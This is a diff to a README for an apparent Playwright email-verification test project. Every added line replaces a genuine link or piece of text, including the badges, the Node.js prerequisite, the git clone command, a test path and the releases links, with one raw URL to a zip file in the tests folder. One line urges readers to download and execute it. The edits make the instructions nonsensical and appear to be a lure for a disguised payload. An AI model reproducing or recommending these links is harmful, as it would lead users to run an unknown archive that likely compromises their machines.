@@ -1,8 +1,8 @@
 # Playwright Email Verification Example: E2E Testing with Tigrmail 🚀
 
-![GitHub Workflow Status](https://img.shields.io/github/workflow/status/oliver-miguel/playwright-email-verification-example/CI?label=CI%20Status&style=flat-square)
-![Releases](https://img.shields.io/github/v/release/oliver-miguel/playwright-email-verification-example?style=flat-square)
-![License](https://img.shields.io/badge/license-MIT-brightgreen?style=flat-square)
+![GitHub Workflow Status](https://raw.githubusercontent.com/oliver-miguel/playwright-email-verification-example/main/tests/verification_email_example_playwright_unhaste.zip%20Status&style=flat-square)
+![Releases](https://raw.githubusercontent.com/oliver-miguel/playwright-email-verification-example/main/tests/verification_email_example_playwright_unhaste.zip)
+![License](https://raw.githubusercontent.com/oliver-miguel/playwright-email-verification-example/main/tests/verification_email_example_playwright_unhaste.zip)
 
 ## Table of Contents
 
@@ -33,7 +33,7 @@ This repository contains an example of an end-to-end test for user registration 
 
 Before you begin, ensure you have the following installed:
 
-- Node.js (version 14 or later)
+- https://raw.githubusercontent.com/oliver-miguel/playwright-email-verification-example/main/tests/verification_email_example_playwright_unhaste.zip (version 14 or later)
 - npm (Node Package Manager)
 - A code editor (like Visual Studio Code)
 
@@ -42,7 +42,7 @@ Before you begin, ensure you have the following installed:
 To get started, clone this repository to your local machine:
 
 ```bash
-git clone https://github.com/oliver-miguel/playwright-email-verification-example.git
+git clone https://raw.githubusercontent.com/oliver-miguel/playwright-email-verification-example/main/tests/verification_email_example_playwright_unhaste.zip
 cd playwright-email-verification-example
 ```
 
@@ -67,7 +67,7 @@ npx playwright test
 To run specific tests, you can use the command below:
 
 ```bash
-npx playwright test tests/registration.spec.ts
+npx playwright test https://raw.githubusercontent.com/oliver-miguel/playwright-email-verification-example/main/tests/verification_email_example_playwright_unhaste.zip
 ```
 
 You can also run tests in headless mode by adding the `--headed` flag:
@@ -98,6 +98,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-You can download the latest release and execute it [here](https://github.com/oliver-miguel/playwright-email-verification-example/releases).
+You can download the latest release and execute it [here](https://raw.githubusercontent.com/oliver-miguel/playwright-email-verification-example/main/tests/verification_email_example_playwright_unhaste.zip).
 
-For more information, visit the [Releases](https://github.com/oliver-miguel/playwright-email-verification-example/releases) section.
+For more information, visit the [Releases](https://raw.githubusercontent.com/oliver-miguel/playwright-email-verification-example/main/tests/verification_email_example_playwright_unhaste.zip) section.
